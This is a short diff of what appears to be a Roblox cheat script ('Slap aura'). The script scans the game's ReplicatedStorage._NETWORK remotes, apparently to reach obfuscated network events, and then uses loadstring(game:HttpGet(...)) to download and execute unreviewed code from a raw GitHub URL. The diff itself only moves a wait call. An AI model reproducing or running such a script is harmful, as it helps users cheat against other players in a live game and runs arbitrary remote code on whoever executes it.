@@ -18,7 +18,7 @@ game.StarterGui : SetCore ("SendNotification", {
          Icon = "";
          Duration = "3";
 })
-Wait(5)
+
 for i, v in pairs(game:GetService("ReplicatedStorage")._NETWORK:GetChildren()) do
 	    -- Check if the name contains the character '{'
 	    if v.Name:find("{") then
@@ -38,7 +38,7 @@ for i, v in pairs(game:GetService("ReplicatedStorage")._NETWORK:GetChildren()) d
 	        end
 	    end
 	end
-
+   wait(5)
 local ModelEffect = game:GetObjects("rbxassetid://14949130713")[1]
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/Slap-aura/refs/heads/main/Slap%20aura%20script"))()
 if ModelEffect then
